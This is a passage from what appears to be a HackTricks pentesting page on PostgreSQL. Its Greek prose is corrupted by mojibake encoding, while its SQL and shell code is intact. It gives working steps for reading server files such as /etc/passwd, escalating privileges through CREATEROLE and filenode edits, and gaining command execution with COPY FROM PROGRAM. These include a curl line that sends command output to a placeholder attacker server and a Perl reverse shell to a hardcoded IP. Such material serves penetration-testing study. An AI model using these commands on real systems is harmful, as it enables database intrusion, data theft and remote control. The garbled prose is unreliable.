ÎÎ± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯ÏƒÏ„Îµ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Î»Î»Î¬ Î­Ï‡ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **CREATEROLE** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î³Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚:**
```sql
GRANT pg_read_server_files TO username;
```
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Î¬Î»Î»ÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ postgres** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎ¿Ï…Î½ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Î® Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎ¿Ï…Î½ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿**. ÎœÏŒÎ½Î¿ **superusers** ÎºÎ±Î¹ **Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ ÏÎ·Ï„Î­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„Î¹Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚** ÏƒÏ„Î¿ [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Î‘Ï€Î»Î® Î“ÏÎ±Ï†Î® Î‘ÏÏ‡ÎµÎ¯Î¿Ï…

ÎœÏŒÎ½Î¿ Î¿Î¹ **super users** ÎºÎ±Î¹ Ï„Î± Î¼Î­Î»Î· Ï„Î¿Ï… **`pg_write_server_files`** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¿ copy Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î½ Î±ÏÏ‡ÎµÎ¯Î±.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯ÏƒÏ„Îµ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Î»Î»Î¬ Î­Ï‡ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`CREATEROLE`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î³Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚:**
```sql
GRANT pg_write_server_files TO username;
```
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï„Î¿ COPY Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Î½Î­Î±Ï‚ Î³ÏÎ±Î¼Î¼Î®Ï‚, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ Î­Î½Î± payload base64 **Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î¼Î¹Î± ÎµÎ½Î¹Î±Î¯Î± Î³ÏÎ±Î¼Î¼Î®**.\
ÎˆÎ½Î±Ï‚ Ï€Î¿Î»Ï ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒÏ‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ **`copy` Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Î¸ÏÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î´Ï…Î±Î´Î¹ÎºÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚.**

### **Î‘Î½Î­Î²Î±ÏƒÎ¼Î± Î´Ï…Î±Î´Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½**

Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Î¬Î»Î»ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î¼ÎµÎ³Î¬Î»Î± Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Î£Ï…Î¼Î²Î¿Ï…Î»Î® bug bounty**: **ÎµÎ³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î¿ **Intigriti**, Î¼Î¹Î± premium **Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± bug bounty Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î±Ï€ÏŒ hackers, Î³Î¹Î± hackers**! Î•Î»Î¬Ï„Îµ Î¼Î±Î¶Î¯ Î¼Î±Ï‚ ÏƒÏ„Î¿ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ÏƒÎ®Î¼ÎµÏÎ±, ÎºÎ±Î¹ Î±ÏÏ‡Î¯ÏƒÏ„Îµ Î½Î± ÎºÎµÏÎ´Î¯Î¶ÎµÏ„Îµ Î²ÏÎ±Î²ÎµÎ¯Î± Î­Ï‰Ï‚ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Î•Î½Î·Î¼Î­ÏÏ‰ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¯Î½Î±ÎºÎ± PostgreSQL Î¼Î­ÏƒÏ‰ ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï…

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® PostgreSQL, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï€Î¯Î½Î±ÎºÎ± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® **ÎµÏ€Î¹ÎºÎ±Î»ÏÏ€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ ÏƒÏ‡ÎµÏ„Î¹ÎºÏŒ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…** ÏƒÏ„Î¿Î½ [ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®** [**ÎµÎ´Ï**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Î‘Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î± Î²Î®Î¼Î±Ï„Î±:

1.  Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·:** Î•Î¬Î½ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î±Ï€ÏŒ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏÏ‰Ï„Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÏÏÎ¹Î± Î­ÎºÎ´Î¿ÏƒÎ· PostgreSQL Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚ `SELECT version()` ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Î¼Îµ brute-force. ÎšÎ¿Î¹Î½Î­Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÎµ ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Unix Ï„Î¿Ï… PostgreSQL ÎµÎ¯Î½Î±Î¹ `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. ÎˆÎ½Î± ÎºÎ¿Î¹Î½ÏŒ ÏŒÎ½Î¿Î¼Î± ÎºÎ»Î¬ÏƒÎ¼Î±Ï„Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ `main`.
2.  Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î¼Î¹Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿ Ï€Î¯Î½Î±ÎºÎ±

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Î‘Ï…Ï„Î® Î· ÎµÏÏÏ„Î·ÏƒÎ· Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ `base/3/1337`. Î— Ï€Î»Î®ÏÎ·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿ Î¸Î± ÎµÎ¯Î½Î±Î¹ `$DATA_DIRECTORY/base/3/1337`, Î´Î·Î»Î±Î´Î® `/var/lib/postgresql/13/main/base/3/1337`.
3.  ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4.  Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿ Ï€Î¯Î½Î±ÎºÎ±

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5.  Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿Î½ [Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„Î® ÎšÏŒÎ¼Î²Î¿Ï… Î‘ÏÏ‡ÎµÎ¯Î¿Ï… PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor) Î³Î¹Î± Î½Î± [ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); Î¿ÏÎ¯ÏƒÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ boolean ÏƒÎ·Î¼Î±Î¯ÎµÏ‚ `rol*` ÏƒÎµ 1 Î³Î¹Î± Ï€Î»Î®ÏÎµÎ¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Î”Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ· Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„Î® ÎšÏŒÎ¼Î²Î¿Ï… Î‘ÏÏ‡ÎµÎ¯Î¿Ï… PostgreSQL](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo\_datatype.gif)
6.  Î•Ï€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÏ„Îµ Ï„Î¿Î½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¼Î­Î½Î¿ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ `lo_*`, ÎºÎ±Î¹ ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7.  _(Î ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬)_ ÎšÎ±Î¸Î±ÏÎ¯ÏƒÏ„Îµ Ï„Î·Î½ ÎºÏÏ…Ï†Î® Î¼Î½Î®Î¼Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¼Î½Î®Î¼Î· ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î±ÎºÏÎ¹Î²ÏŒ SQL ÎµÏÏÏ„Î·Î¼Î±

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. Î¤ÏÏÎ± Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´ÎµÎ¯Ï„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ Ï€Î¯Î½Î±ÎºÎ± ÏƒÏ„Î¿ PostgreSQL.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î³Î¯Î½ÎµÏ„Îµ superadmin ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`. **Î”ÎµÎ¯Ï„Îµ** [**Ï„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE ÏƒÎµ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î±**

Î‘Ï€ÏŒ Ï„Î·Î½[ Î­ÎºÎ´Î¿ÏƒÎ· 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), Î¼ÏŒÎ½Î¿ Î¿Î¹ **super users** ÎºÎ±Î¹ Ï„Î± Î¼Î­Î»Î· Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ **`pg_execute_server_program`** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¿ copy Î³Î¹Î± RCE (Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Îµ ÎµÎ¾Î±Î³Ï‰Î³Î®:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯ÏƒÏ„Îµ Ï…Ï€ÎµÏ-Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Î»Î»Î¬ Î­Ï‡ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`CREATEROLE`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î³Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Î‰ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ `multi/postgres/postgres_copy_from_program_cmd_exec` module Î±Ï€ÏŒ Ï„Î¿ **metasploit**.\
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± [**ÎµÎ´Ï**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Î•Î½Ï Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ Ï‰Ï‚ CVE-2019-9193, Ï„Î¿ Postges Î´Î®Î»Ï‰ÏƒÎµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î®Ï„Î±Î½ [Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎºÎ±Î¹ Î´ÎµÎ½ Î¸Î± Î´Î¹Î¿ÏÎ¸Ï‰Î¸ÎµÎ¯](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE Î¼Îµ Î³Î»ÏÏƒÏƒÎµÏ‚ PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE Î¼Îµ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ PostgreSQL

Î‘Ï†Î¿Ï Î­Ï‡ÎµÏ„Îµ **Î¼Î¬Î¸ÎµÎ¹** Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Î±Î½Î¬ÏÏ„Î·ÏƒÎ· **Ï€ÏÏ‚ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ **RCE Î±Î½ÎµÎ²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· postgresql ÎºÎ±Î¹ Ï†Î¿ÏÏ„ÏÎ½Î¿Î½Ï„Î¬Ï‚ Ï„Î·Î½**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE Î¼Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ PostgreSQL

{% hint style="info" %}
ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ RCE Î´Î¹Î±Î½ÏÏƒÎ¼Î±Ï„Î± ÎµÎ¯Î½Î±Î¹ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± Ï‡ÏÎ®ÏƒÎ¹Î¼Î± ÏƒÎµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± SQLi ÏƒÏ…Î¼Ï†ÏÎ±Î¶ÏŒÎ¼ÎµÎ½Î±, ÎºÎ±Î¸ÏÏ‚ ÏŒÎ»Î± Ï„Î± Î²Î®Î¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î´Î·Î»ÏÏƒÎµÏ‰Î½ SELECT
{% endhint %}

Î¤Î¿ **Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½** Ï„Î¿Ï… PostgreSQL ÎµÎ¯Î½Î±Î¹ **Î³ÏÎ±Î¼Î¼Î­Î½Î¿** Î±Ï€ÏŒ Ï„Î¿Î½ **Ï‡ÏÎ®ÏƒÏ„Î· postgres**, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„ÏŒÏ‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î¿Ï€ÏŒÏ„Îµ Ï‰Ï‚ **superuser**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½, ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿.**

![](<../.gitbook/assets/image (322).png>)

#### **RCE Î¼Îµ ssl\_passphrase\_command**

